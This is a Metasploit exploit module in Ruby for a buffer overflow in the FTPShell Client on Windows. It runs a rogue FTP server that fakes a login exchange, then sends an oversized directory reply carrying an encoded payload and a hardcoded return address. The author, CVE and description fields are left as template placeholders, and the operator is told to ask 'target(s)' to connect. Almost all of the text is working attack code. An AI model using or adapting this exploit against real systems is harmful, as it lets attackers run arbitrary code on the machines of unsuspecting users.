##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::TcpServer

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'FTPShell Client Buffer over flow exploit',
      'Description'    => %q{
         description of exploit 
        },
      'Author'   =>
        [
          'EXPLOIT AUTHOR',           # Original exploit author
          'EXPLOIT AUTHOR'   # MSF module author
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', 'CVE-'],
          [ 'EDB', '' ]
        ],
      'Payload'        =>
        {
          'Space'    =>400 ,
          'BadChars' => "\x00\x22\x0d\x0a\x0b"
        },
      'Platform'       => 'win',
      'Targets'        =>
        [
                 #CALL ESI you can also use \x71\x28\x45
          [ 'Windows Universal', {'Ret' => "\xed\x2e\x45" } ]
        ],
      'Privileged'     => false,
      'DefaultOptions' =>
        {
          'SRVHOST' => '0.0.0.0',
          'EXITFUNC' => 'thread'
        },
      'DisclosureDate' => '',
      'DefaultTarget'  => 0))

    register_options [ OptPort.new('SRVPORT', [ true, 'The  FTP port to listen on',21  ]) ]
  end

  def exploit
    srv_ip_for_client = datastore['SRVHOST']
    if srv_ip_for_client == '0.0.0.0'
      if datastore['LHOST']
        srv_ip_for_client = datastore['LHOST']
      else
        srv_ip_for_client = Rex::Socket.source_address('50.50.50.50')
      end
    end

    srv_port = datastore['SRVPORT']

    print_status("Please ask your target(s) to connect to #{srv_ip_for_client}:#{srv_port}")
    super
  end

  def on_client_connect(client)
    p = regenerate_payload(client)
    return if p.nil?
    print_status("#{client.peerhost} - connected.")

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}") unless res.empty?
    print_status("#{client.peerhost} - Response: Sending 220 Welcome")
    welcome = "220 Welcome.\r\n"
    client.put(welcome)

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: sending 331 OK")
    user = "331 OK.\r\n"
    client.put(user)

    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")
    print_status("#{client.peerhost} - Response: Sending 230 OK")
    pass = "230 OK.\r\n"
    client.put(pass)
    res = client.get_once.to_s.strip
    print_status("#{client.peerhost} - Request: #{res}")

    sploit = '220 "'
    sploit << payload.encoded
    sploit << "\x20" * (payload_space - payload.encoded.length)
    sploit << target.ret
    sploit << "\" is current directory\r\n"

    print_status("#{client.peerhost} - Request: Sending the malicious response")
    client.put(sploit)

  end
end
            
